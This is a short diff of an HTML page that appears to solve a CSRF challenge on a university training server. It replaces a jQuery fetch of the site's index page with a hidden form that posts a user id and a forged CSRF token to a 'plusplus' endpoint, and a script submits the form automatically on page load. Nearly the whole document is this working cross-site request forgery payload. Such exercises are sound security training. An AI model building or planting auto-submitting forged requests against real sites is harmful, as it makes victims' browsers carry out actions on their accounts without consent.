@@ -1,14 +1,9 @@
-<a id="ref"></a>
+<form name="csrfForm" action="https://snickerboa.it.liu.se/user/csrfchallengefour/plusplus" method="POST">
+	<input type="hidden" name="userid" value="86109c9eed773b92480275854966986d3c4901a6" />
+	<input type="hidden" name="csrfToken" value="-25481388333106810103171565690416076047" />
+	<input type="submit"/>
+</form>
 
-<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
 <script>
-    resp = $.ajax({
-	    dataType: "text",
-	    type: "GET",
-	    url: "https://snickerboa.it.liu.se/index.jsp",
-	    data: {
-	    },
-	    async: false
-    });
-    document.getElementById("ref").innerHTML = resp.responseText;
-</script>
+	document.csrfForm.submit();
+</script> 
